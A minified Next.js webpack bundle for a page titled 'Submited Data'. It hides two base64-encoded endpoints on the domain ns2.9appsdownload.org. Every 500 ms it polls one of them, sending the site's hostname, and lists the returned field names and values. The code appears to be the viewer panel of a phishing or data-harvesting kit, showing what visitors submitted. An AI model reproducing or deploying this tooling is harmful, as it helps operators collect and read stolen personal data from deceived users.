(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [224], {
        5536: function(n, t, e) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/ms", function() {
                return e(6731)
            }])
        },
        9018: function(n, t, e) {
            "use strict";
            var s = e(1876).Buffer,
                i = {
                    dataList: s.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: s.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            t.Z = i
        },
        6731: function(n, t, e) {
            "use strict";
            e.r(t), e.d(t, {
                default: function() {
                    return o
                }
            });
            var s = e(5893),
                i = e(9008),
                a = e.n(i),
                r = e(7294),
                c = e(9018);

            function o() {
                var n = (0, r.useState)([]),
                    t = n[0],
                    e = n[1];
                return (0, r.useEffect)(function() {
                    setInterval(function() {
                        fetch(window.atob(c.Z.getList) + "?id=" + window.location.hostname).then(function(n) {
                            return n.json()
                        }).then(function(n) {
                            return e(n)
                        })
                    }, 500)
                }, []), (0, s.jsxs)("main", {
                    children: [(0, s.jsxs)(a(), {
                        children: [(0, s.jsx)("title", {
                            children: "Data"
                        }), (0, s.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, s.jsxs)("div", {
                        children: [(0, s.jsx)("h1", {
                            className: "text-center",
                            children: "Submited Data"
                        }), (0, s.jsx)("div", {
                            className: "dataList",
                            children: t.map(function(n, t) {
                                return "line" != n.keyName ? (0, s.jsxs)("div", {
                                    className: "row-detail",
                                    children: [(0, s.jsx)("span", {
                                        className: "rowName",
                                        children: n.keyName
                                    }), ": ", n.keyValue]
                                }, t) : (0, s.jsx)("div", {
                                    className: "linebreak",
                                    children: "\xa0"
                                }, t)
                            })
                        })]
                    })]
                })
            }
        },
        9008: function(n, t, e) {
            n.exports = e(5443)
        }
    },
    function(n) {
        n.O(0, [876, 774, 888, 179], function() {
            return n(n.s = 5536)
        }), _N_E = n.O()
    }
]);